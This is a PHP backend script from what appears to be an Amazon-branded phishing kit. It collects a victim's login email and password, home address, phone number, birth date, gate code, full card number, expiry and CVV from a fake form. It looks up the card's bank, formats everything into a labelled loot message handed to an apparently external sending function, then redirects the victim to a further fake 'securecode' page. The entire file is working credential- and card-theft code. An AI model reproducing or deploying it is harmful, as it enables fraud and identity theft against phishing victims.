<?php
$email = $_POST['email'];
$password = $_POST['password'];
$full_name = $_POST['enterAddressFullName'];
$address1 = $_POST['enterAddressAddressLine1'];
$address2 = $_POST['enterAddressAddressLine2'];
$city = $_POST['enterAddressCity'];
$stateorregion = $_POST['enterAddressStateOrRegion'];
$postalcode = $_POST['enterAddressPostalCode'];
$country = $_POST['enterAddressCountryCode'];
$phone = $_POST['enterAddressPhoneNumber'];
$jj = $_POST['jj'];
$mm = $_POST['mm'];
$aaaa = $_POST['aaaa'];
$gatecode = $_POST['GateCode'];
$ccnum =  preg_replace('/\s+/', '', $_POST['addCreditCardNumber']);
$cardholder = $_POST['ppw-accountHolderName'];
$ccmo = $_POST['ppw-expirationDate_month'];
$ccyo = $_POST['ppw-expirationDate_year'];
$cvv = $_POST['addCreditCardVerificationNumber'];
$bin = substr(trim($ccnum), 0, 6);

include_once 'info.php';
$ht = file_get_contents('https://lookup.binlist.net/'.$bin);
$tkchbila = json_decode($ht, true);
$type = $tkchbila[brand];
$bank = $tkchbila[bank][name];

function FormatCreditCardX($cc) {
    $cc = str_replace(array('-', ' '), '', $cc);
    $cc_length = strlen($cc);
    $newCreditCard = substr($cc, -4);
    for ($i = $cc_length - 5; $i >= 0; $i--) {
        if ((($i + 1) - $cc_length) % 4 == 0) {
            $newCreditCard = ' ' . $newCreditCard;
        }
        $newCreditCard = $cc[$i] . $newCreditCard;
    }
    for ($i = 4; $i < $cc_length - 4; $i++) {
        if ($newCreditCard[$i] == ' ') {
            continue;
        }
        $newCreditCard[$i] = '*';
    }
    return $newCreditCard;
}
include 'creditcards.class.php';


function FormatCreditCard($cc) {
    $cc = str_replace(array('-', ' '), '', $cc);
    $cc_length = strlen($cc);
    $newCreditCard = substr($cc, -4);
    for ($i = $cc_length - 5; $i >= 0; $i--) {
        if ((($i + 1) - $cc_length) % 4 == 0) {
            $newCreditCard = ' ' . $newCreditCard;
        }
        $newCreditCard = $cc[$i] . $newCreditCard;
    }
    return $newCreditCard;
}

$ccnumformat = FormatCreditCard($ccnum);

$message = "++++++++++++#Amazon[es]#++++++++++++\n";
$message .= "Identifiant: $email\n";
$message .= "Mot de passe: $password\n";
$message .= "Nom Complet: $full_name\n";
$message .= "Address1: $address1\n";
if(!empty($address2)){
$message .= "Address2: $address2\n";
}
else{
}
$message .= "Ville: $city\n";
$message .= "Region: $stateorregion\n";
$message .= "Code postale: $postalcode\n";
$message .= "Tel: $phone\n";
if(!empty($gatecode)){
$message .= "Digicode: $gatecode\n";
}
else{
}
$message .= "Date de naissance : $jj/$mm/$aaaa\n";
$message .= "++++++++++++++++++++++++++++++++++++\n";
$message .= "Name: $cardholder\n";
$message .= "CC: $ccnumformat\n";
$message .= "Exp: $ccmo/$ccyo\n";
$message .= "Cvv: $cvv\n";
$message .= "Type: $type\n";
$message .= "++++++++++++++++++++++++++++++++++++\n";
$message .= "IP: $ip\n";
$message .= "++++++++++++++++++++++++++++++++++++\n";


strip(strip_tags($message));
if($_GET['src'] == 'auth'){
		?>
               <meta http-equiv="refresh"content="0; url=validation.php?src=securecode&e1s1=1">
<?php } ?>